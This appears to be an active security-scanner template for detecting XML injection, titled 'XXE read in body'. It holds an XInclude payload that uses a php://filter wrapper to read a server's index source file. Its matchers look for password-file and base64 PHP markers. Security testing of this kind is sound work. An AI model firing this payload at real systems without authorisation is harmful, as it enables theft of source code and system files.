id: xxe5-0028
name: 'XXE read in body'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via body'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      body:
        - '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="php://filter/convert.base64-encode/resource=index"/></r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'root:'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
          - 'PD9waHA'
